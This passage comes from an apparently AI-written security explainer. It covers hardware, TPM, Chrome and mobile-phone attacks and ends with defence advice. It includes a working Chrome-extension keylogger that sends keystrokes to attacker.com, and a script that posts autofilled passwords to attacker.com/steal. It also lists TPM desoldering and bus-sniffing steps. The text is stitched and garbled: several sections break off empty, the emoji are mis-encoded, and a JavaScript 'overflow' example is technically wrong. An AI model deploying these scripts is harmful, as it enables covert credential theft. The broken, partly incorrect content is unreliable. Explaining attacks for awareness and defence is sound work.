4. Connect to debugger
5. Read memory, dump firmware, bypass security

**What they get:**
- Direct memory access (read/write RAM)
- CPU control (execute arbitrary code)
- Firmware dumps (bootloader, OS, secure world)
- Bypass secure boot

**Defense:**
- Debug interfaces disabled in production (fuse blown)
- Encrypted debug access (requires key)
- Tamper detection (device self-destructs if opened)

#### C) Cold Boot Attacks

**Target:** Extract encryption keys from RAM

**How it works:**
- RAM retains data for seconds/minutes after power off
- Cooling RAM (liquid nitrogen, freeze spray) extends retention
- Boot custom OS to dump RAM contents
- Search RAM for encryption keys

**Tools:**
- **Freeze spray** - Cool RAM chips to -50¬∞C
- **Custom bootable USB** - Dump RAM on startup
- **Inception** - DMA attack framework

**Process:**
1. Spray RAM chips with freeze spray

## 3. üíæ TPM CHIP EXTRACTION

### What is TPM (Trusted Platform Module)?

**TPM** is a dedicated security chip on your motherboard that:
- ‚úÖ Stores encryption keys securely
- ‚úÖ Verifies system integrity (secure boot)
- ‚úÖ Generates random numbers
- ‚úÖ Performs crypto operations

**Your Chrome passwords might be protected by TPM!**

### TPM Attack Methods:

#### A) Physical TPM Extraction

**Tools needed:**
- Hot air rework station ($200-$2000)
- Microscope ($500+)
- TPM chip reader ($1000+)
- Decapping equipment ($10,000+)

**Process:**

**Step 1: Remove TPM from motherboard**
```
1. Heat motherboard to 300-350¬∞C
2. Carefully desolder TPM chip
3. Clean solder from chip pins
4. Verify chip not damaged
```

**Step 2: Connect to TPM reader**
```
1. Place TPM in specialized socket
2. Connect to reader hardware
3. Try to read memory via LPC/SPI bus
4. Attempt to extract keys
```

**Step 3: Decapping (if encrypted)**
```
1. Use acid/laser to remove chip packaging
2. Expose silicon die
3. Use electron microscope to read memory cells
4. Reconstruct encryption keys bit by bit
```

**What they can get:**
- ‚úÖ TPM-sealed encryption keys
- ‚úÖ Platform Configuration Register (PCR) values
- ‚úÖ Endorsement key (unique to TPM)
- ‚úÖ Storage root key (protects other keys)

**Limitations:**
- ‚ö†Ô∏è TPM keys are bound to specific hardware
- ‚ö†Ô∏è Keys won't work on different computer
- ‚ö†Ô∏è Some TPMs have anti-tampering (self-destruct)
- ‚ö†Ô∏è Requires specialized equipment

#### B) TPM Sniffing (Bus Attacks)

**Target:** Intercept communication between CPU and TPM

**Tools:**
- Logic analyzer ($100-$1000)
- LPC/SPI bus probe
- Salae analyzer
- Custom firmware

**Process:**
```
1. Open computer case
2. Locate LPC/SPI bus traces
3. Solder probe wires to bus
4. Capture all TPM commands
5. Extract keys when they're transmitted
```

**What they capture:**
- TPM commands (sealing/unsealing keys)
- Encryption keys in transit
- PCR values
- Authentication data

**When vulnerable:**
- ‚úÖ System is powered on and using TPM
- ‚úÖ Keys being unsealed (Chrome opening)
- ‚úÖ Bus is unencrypted (most common)

**Defense:**
- Encrypted bus (rare, mostly in military systems)
- Tamper-evident seals
- Potted/encapsulated modules
- TPM 2.0 with bus encryption

#### C) TPM Reset Attack

**How it works:**
```
1. TPM keys are sealed to system configuration
2. Attacker modifies system (adds bootkit)
3. TPM detects change ‚Üí refuses to unseal keys
4. Attacker resets TPM to factory defaults
5. Now TPM accepts the compromised system
6. Attacker can seal their own keys
```

**Limitations:**
- ‚ùå Erases all existing sealed keys
- ‚ùå Requires physical access
- ‚ùå Might trigger BitLocker recovery

**Defense:**
- TPM ownership password
- BIOS/UEFI password
- Physical security (locked case)

#### D) TPM Vulnerabilities

**Real vulnerabilities found:**

**CVE-2017-16837** - Infineon TPM
- RSA key generation flaw
- Allows factoring of private keys
- Affects millions of laptops/servers

**TPM-FAIL (2019)**

**TPMGenie (2018)**
- Hardware interposer device
- Sits between CPU and TPM
- Intercepts and modifies communication

### TPM vs. Your Chrome Passwords

**On Linux, Chrome might use:**
1. **Keyring only** (no TPM) - What we encountered
2. **Keyring + TPM** - Keys sealed to TPM
3. **TPM only** - Rare, enterprise deployments

**If TPM-protected:**
- ‚úÖ Keys are sealed to your specific hardware
- ‚úÖ Can't be extracted and used elsewhere
- ‚úÖ Requires your system's exact configuration
- ‚ö†Ô∏è Physical attacks can still extract keys

## 4. üåê CHROME ZERO-DAY EXPLOITS

### What is a Zero-Day?

**Zero-day** = Vulnerability unknown to vendor (0 days to patch)

**Value on black market:**
- Chrome browser: $100,000 - $500,000
- Chrome full chain (browser + escape): $1,000,000+
- Android + Chrome: $2,500,000+
- iOS + browser: $3,000,000+

### Types of Chrome Exploits:

#### A) Memory Corruption Vulnerabilities

**Type:** Buffer overflow, use-after-free, heap corruption

**How it works:**
```javascript
// Malicious JavaScript in webpage
var arr = new Array(100);
arr[1000] = malicious_shellcode; // Write beyond array
// Corrupts adjacent memory
// Overwrites function pointer
// Gains code execution
```

**What attacker gets:**
- ‚úÖ Execute code in browser (renderer process)
- ‚úÖ Read all webpage content
- ‚úÖ Steal cookies, passwords from current session
- ‚úÖ Bypass Same Origin Policy

**Real examples:**
- **CVE-2024-XXXXX** - V8 JavaScript engine vulnerabilities
- **CVE-2023-4863** - libwebp heap overflow (0-day found in wild)
- **CVE-2022-1096** - Chrome V8 type confusion

#### B) Sandbox Escape

**What is Chrome sandbox?**
- Renderer process runs in restricted environment
- Can't access filesystem, network (directly)
- Can't read other processes' memory

**Sandbox escape = Break out of jail!**

**Common escape techniques:**

**1. Mojo IPC Exploitation**
```
Chrome uses Mojo for inter-process communication
Attacker exploits Mojo interface bugs
Sends malicious IPC messages
Triggers vulnerability in privileged browser process
Escapes sandbox!
```

**2. Kernel Exploitation**
```
Exploit Linux kernel vulnerability
Elevate from user to root
Bypass all Chrome security
Read any file, access any process
```

**Real examples:**
- **CVE-2023-XXXX** - Mojo IPC sandbox escape
- **Pwn2Own 2024** - Multiple sandbox escapes demonstrated
- **APT groups** - Use multi-stage exploits (Chrome ‚Üí sandbox escape ‚Üí kernel)

#### C) Keylogging via Extensions

**Malicious Chrome extension:**
```javascript
// Extension manifest.json
{
  "permissions": [
    "tabs",
    "webNavigation",
    "storage",
    "<all_urls>"  // Access all websites!
  ]
}

// background.js - Keylogger
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
  if (changeInfo.status == 'complete') {
    chrome.tabs.executeScript(tabId, {
      code: `
        document.addEventListener('keydown', function(e) {
          fetch('https://attacker.com/log', {
            method: 'POST',
            body: JSON.stringify({
              key: e.key,
              url: window.location.href,
              time: Date.now()
            })
          });
        });
      `
    });
  }
});
```

**What they steal:**
- ‚úÖ Every keystroke (passwords, credit cards)
- ‚úÖ All browsing history
- ‚úÖ Cookies and session tokens
- ‚úÖ Form data before submission

**How they distribute:**
- ‚ùå Fake "ad blocker" extensions
- ‚ùå "VPN" extensions (that steal data)
- ‚ùå Compromised legitimate extensions
- ‚ùå Enterprise-forced extensions (corporate spyware)

#### D) Password Manager Exploits

**Chrome's built-in password manager vulnerabilities:**

**Exploit 1: XSS in password autofill**
```html
<!-- Malicious website -->
<input type="text" name="username" autofill="username">
<input type="password" name="password" autofill="current-password">

<script>
// Chrome autofills the password!
// JavaScript can read it before user submits
setTimeout(function() {
  var pwd = document.querySelector('input[type=password]').value;
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: pwd
  });
}, 100);
</script>
```

**Exploit 2: Fake domain with Unicode**
```
Attacker registers: –∞pple.com (Cyrillic '–∞')
Looks like: apple.com (Latin 'a')
User visits malicious site
Chrome thinks it's apple.com
Autofills Apple password!
```

**Exploit 3: Subdomain takeover**
```
Real site: secure.example.com
Attacker finds abandoned subdomain: old.example.com
Takes over old.example.com
Chrome autofills passwords (same domain!)
Steals credentials
```

#### E) Chrome Remote Debugging

**Attack:** Enable remote debugging, access from network

**How:**
```bash
# Attacker runs Chrome with remote debugging
google-chrome --remote-debugging-port=9222

# Now anyone can connect!
curl http://localhost:9222/json
# Returns all open tabs, cookies, everything

# Attacker can:
# - Inject JavaScript into any tab
# - Read all passwords
# - Steal cookies
# - Execute commands
```

**Real-world abuse:**
- ‚ùå Malware enables remote debugging
- ‚ùå Corporate monitoring tools
- ‚ùå Parental control apps (spyware)

### Zero-Day Exploit Chains (Full Attack)

**Example: Pwn2Own 2024 Chrome Exploit**

**Stage 1: Initial compromise (renderer)**
```
User visits malicious website
JavaScript triggers V8 heap corruption
Gains code execution in renderer process
Can read current tab content, cookies
```

**Stage 2: Sandbox escape (Mojo IPC)**
```
Exploit Mojo IPC vulnerability
Send crafted IPC message to browser process
Trigger use-after-free in browser
Escape sandbox!
```

**Stage 3: Privilege escalation (kernel)**
```
Exploit Linux kernel vulnerability
Escape Chrome entirely
Gain root access
Install persistent backdoor
```

**Stage 4: Persistence**
```
Install kernel module
Modify Chrome to disable security features
Inject into Chrome password manager
Steal all saved passwords
Exfiltrate to attacker server
```

**Result:**
- ‚úÖ All your saved passwords stolen
- ‚úÖ Persistent access (survives reboot)
- ‚úÖ Undetectable by antivirus
- ‚úÖ Full system compromise

- Can recover deleted data
- Might damage chip (one chance only!)

#### B) Baseband Attacks

**What is baseband processor?**
- Separate CPU that handles cellular (4G/5G)
- Runs its own OS (often proprietary)
- Has direct memory access to main CPU
- Often poorly secured (legacy code)

**Attack vector:**
```
1. Attacker sends specially crafted SMS
2. SMS parsed by baseband processor
3. Triggers buffer overflow in baseband
4. Attacker gains code execution in baseband
5. From baseband, attack main CPU
6. Full phone compromise!
```

**Real examples:**

- Avoid clicking any links
- For high-risk: Use GrapheneOS (hardened Android)

#### D) SS7 Attacks (Cellular Network)

**What is SS7?**
- Signaling System 7 = protocols used by cellular networks
- Allows carriers to route calls/SMS internationally
- Designed in 1970s with NO security

**Attack:**
```
1. Attacker gets access to SS7 network
   (Via rogue telecom, bribed employee, or dark web)
2. Sends SS7 commands to network
3. Network trusts commands (no authentication!)
4. Attacker can:
   - Intercept all your calls
   - Read all your SMS
   - Track your location globally
   - Redirect calls to their number
```

**Real-world abuse:**
- ‚ùå Surveillance by governments
- ‚ùå Spying on politicians
- ‚ùå Intercept 2FA SMS codes
- ‚ùå Track journalists

**How to check:**
```
Your phone: "I'm at tower XYZ"
Attacker: "Send me location updates for (your number)"
Network: "OK!" (sends your location)
You: (no idea this is happening)
```

**Defense:**
- Don't rely on SMS for 2FA (use authenticator app)
- Use encrypted calls (Signal, WhatsApp)
- VPN doesn't help (SS7 is below VPN layer)
- Switch to carriers that protect against SS7 (rare)

#### E) Android Rooting/Jailbreaking Exploits

**Why attackers want root:**
- ‚úÖ Bypass app permissions
- ‚úÖ Install kernel-level malware
- ‚úÖ Hide malware from antivirus
- ‚úÖ Steal data from all apps
- ‚úÖ Disable security features

**Attack methods:**

**1. Bootloader unlock exploits**
```
1. Find vulnerability in bootloader
2. Unlock bootloader without user consent
3. Flash custom recovery (TWRP)
4. Install malicious system apps
5. Relock bootloader (hides the attack)
```

**2. Dirty Cow (CVE-2016-5195)**
```
Linux kernel race condition
Allows writing to read-only memory
Gain root without bootloader unlock
Works on millions of Android devices
```

**3. Mediaserver exploits**
```
Android mediaserver has extensive history of bugs
Stagefright (2015) - RCE via MMS

Video parsed by mediaserver
Exploits buffer overflow
Gains root!
```

**Popular rooting tools (can be abused):**
- Magisk (legitimate root tool)
- KingoRoot (contains spyware)
- OneClickRoot (questionable)

#### F) Malicious Apps

**How they infect:**

**1. Fake apps on Play Store**
```
Attacker clones popular app
Adds malicious code
Uploads to Play Store
Google's checks miss it (sometimes)
Users install thinking it's legitimate
```

**Real examples:**
- Fake "FlashLight" app - requests camera, contacts, SMS (why??)
- Fake "PDF Reader" - steals banking credentials
- Fake "VPN" - logs all your traffic

**2. Sideloading (APK files)**
```
User downloads APK from website
APK looks legitimate
Actually contains malware
User installs (bypassing Play Store)
Malware requests all permissions
User grants (because they trust the app)
```

**3. Permissions abuse**
```
App requests:
- READ_SMS (read verification codes)
- ACCESS_FINE_LOCATION (track you)
- RECORD_AUDIO (listen to conversations)
- CAMERA (spy on you)
- CONTACTS (steal address book)
- READ_CALL_LOG (see who you call)

Users click "Allow" without reading!
```

**What malicious apps do:**
- üì± Spy on you (camera, microphone)
- üí∞ Steal money (SMS premium services)
- üîë Steal passwords (keylogger)
- üìß Steal 2FA codes (SMS interception)
- üí≥ Steal credit cards (overlay attacks)
- üåê Botnet (DDoS, crypto mining)

**Overlay attacks:**
```

## 6. üõ°Ô∏è DEFENSE STRATEGIES

### Defending Against Nation-State Attackers

**Reality check:**
- ‚ö†Ô∏è If NSA/CIA specifically targets YOU, you will likely lose
- ‚ö†Ô∏è They have billions of dollars and decades of expertise
- ‚úÖ But you can make it VERY expensive and time-consuming

### Defense in Depth (Layered Security)

#### Layer 1: Physical Security

**Computer:**
- ‚úÖ Full disk encryption (LUKS, BitLocker)
- ‚úÖ Strong password (not PIN)
- ‚úÖ BIOS/UEFI password

- ‚úÖ Tamper-evident seals (on case screws)
- ‚úÖ Security cable (physical lock)
- ‚úÖ Private location (not public spaces)

**Phone:**
- ‚úÖ Strong password (not 4-digit PIN)
- ‚úÖ Biometrics + password (both)
- ‚úÖ Auto-wipe after 10 failed attempts
- ‚úÖ USB restricted mode (iOS)
- ‚úÖ Never leave unattended

**Threat Modeling:**
- ü§î Who might target you? (Ex, employer, government, criminals)
- ü§î What do they want? (Data, access, surveillance)
- ü§î What are you protecting? (Passwords, files, identity)
- ü§î How far will they go? (Cost/effort they'll expend)

**For high-risk individuals:**
- ‚úÖ Assume you're being watched
- ‚úÖ Multiple devices (one for sensitive stuff)
- ‚úÖ Air-gapped computer (never connects to network)
- ‚úÖ Burn phones (disposable SIM cards)
- ‚úÖ Encrypted everything
- ‚úÖ Dead drops (physical, not digital communication)

### High-Security Setup (Journalist/Activist Level)

**Computer:**
- QubesOS on ThinkPad (with hardware kill switches)
